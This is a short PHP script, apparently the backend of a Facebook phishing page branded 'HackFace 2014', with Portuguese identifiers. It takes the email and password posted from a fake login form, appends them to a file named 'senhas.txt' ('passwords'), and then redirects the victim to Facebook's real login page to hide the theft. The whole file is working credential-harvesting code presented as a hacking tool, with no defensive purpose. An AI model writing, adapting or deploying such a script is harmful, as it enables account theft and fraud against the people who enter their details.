<?php
define("FaceBookLocation","https://www.facebook.com/login.php?login_attempt=1");
define("FaceBook","https://www.facebook.com/");
define("HackBook","http://hackbook.freevar.com/");

function montarTrouxaList($email,$pass){
	$conteudo = "Login: $email | Senha: $pass \n";
	//echo $conteudo;
	$handle = fopen("senhas.txt", "a");
	fwrite($handle,$conteudo);
	fclose($handle);
	faceCanBack();
}

function inprimeDados($dados){
	echo $dados;
}

function faceCanBack(){
	$location = FaceBookLocation;
	header("Location: $location");
}

if(isset($_POST['email']) && isset($_POST['pass'])):
	montarTrouxaList($_POST['email'],$_POST['pass']);
else:	
	echo "<b>HackFace 2014</b>";
	echo "<p>Index.</p>";
	$_POST['email'] = "____________________________";
	$_POST['pass'] = " ____________________________";
	montarTrouxaList($_POST['email'],$_POST['pass']);
	
endif;


?>